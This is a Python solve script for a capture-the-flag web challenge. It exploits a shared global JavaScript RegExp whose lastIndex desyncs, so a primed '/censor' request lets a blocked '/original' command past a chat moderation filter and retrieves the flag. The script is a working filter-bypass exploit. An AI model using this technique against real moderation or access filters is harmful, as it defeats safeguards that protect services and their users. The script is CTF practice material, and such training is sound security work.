#!/usr/bin/env python3
"""OnMute — desync a shared ``RegExp.lastIndex`` to smuggle ``/original`` past a filter.

The moderator (``moderation/filter.js``) compiles ONE ``RegExp`` per session and caches it
(``/original`` is the first entry in the blocklist). Two different functions share that same
stateful, global (``g`` flag) regexp object:

  - ``checkContent`` (guards every chat message) scans with ``exec`` in a loop until it
    returns ``null`` — which also resets ``lastIndex`` to 0, so used in isolation it is
    consistent.
  - ``matchesPolicy`` (used by the ``/censor <start> <end>`` bot command to flag a *track
    fragment*) calls ``re.test(fragment)``. With the ``g`` flag, ``.test()`` on a *match*
    advances ``lastIndex`` past the match and does **not** reset it.

So: prime the session by making ``/censor`` test a fragment that contains a blocklisted word
(e.g. ``массаж``, found dynamically in track 1's censored text) — this leaves the shared
regexp's ``lastIndex`` sitting past that word. The very next message on the same session,
``/original 4``, is scanned by ``checkContent`` starting from that non-zero ``lastIndex``, so
the leading ``/original`` in the string is skipped over and the filter reports no violation.
The command executes and the bot returns the uncensored track text — flag included. See
``onmute_writeup.md`` §3 for the full source-level trace.

Run::

    uv run python onmute/solve_onmute.py
"""

from __future__ import annotations

import sys
from typing import Any

import requests

BASE = "https://onmute-xtegmx4v.avitoctf.ru"
PRIME_TRACK_ID = 1
TARGET_TRACK_ID = 4
BLOCKED_WORD = "массаж"
FLAG_MARKER = "avito{"
HTTP_OK = 200


def emit(message: str) -> None:
    """Write a single line to stdout (CLI output without ``print``)."""
    sys.stdout.write(message + "\n")


def find_word_offsets(censored_text: str, word: str) -> tuple[int, int]:
    """Return the ``[start, end)`` character offsets of *word* in *censored_text*."""
    start = censored_text.find(word)
    if start < 0:
        raise ValueError(f"blocked word {word!r} not found in the censored track text")
    return start, start + len(word)


def post_comment(session: requests.Session, track_id: int, text: str) -> tuple[int, Any]:
    """POST a chat comment to a track and return ``(status_code, parsed_json_or_text)``."""
    resp = session.post(f"{BASE}/api/tracks/{track_id}/comment", json={"text": text}, timeout=30)
    try:
        body: Any = resp.json()
    except ValueError:
        body = resp.text
    return resp.status_code, body


def scan_for_flag(obj: object) -> str | None:
    """Return the ``avito{...}`` substring found anywhere in *obj*, or ``None``."""
    text = obj if isinstance(obj, str) else str(obj)
    start = text.find(FLAG_MARKER)
    if start < 0:
        return None
    end = text.find("}", start)
    return text[start : end + 1] if end > 0 else None


def main() -> None:
    """Prime the shared regexp on track 1, then smuggle ``/original`` on track 4."""
    session = requests.Session()

    track_resp = session.get(f"{BASE}/api/tracks/{PRIME_TRACK_ID}", timeout=30)
    track_resp.raise_for_status()
    censored_text = track_resp.json()["track"]["text"]
    start, end = find_word_offsets(censored_text, BLOCKED_WORD)
    emit(f"[prime] {BLOCKED_WORD!r} at [{start}:{end}] in track {PRIME_TRACK_ID}")

    status, body = post_comment(session, PRIME_TRACK_ID, f"/censor {start} {end}")
    emit(f"[prime] POST /censor {start} {end} -> HTTP {status} {body}")

    status, body = post_comment(session, TARGET_TRACK_ID, f"/original {TARGET_TRACK_ID}")
    emit(f"[bypass] POST /original {TARGET_TRACK_ID} -> HTTP {status}")
    if status != HTTP_OK:
        sys.exit(f"bypass failed — filter blocked the command: {body}")

    message = body.get("message") if isinstance(body, dict) else body
    flag = scan_for_flag(message)
    if flag:
        emit(f"FLAG: {flag}")
    else:
        emit("no flag found in the original text — full message below:")
        emit(str(message))


if __name__ == "__main__":
    main()
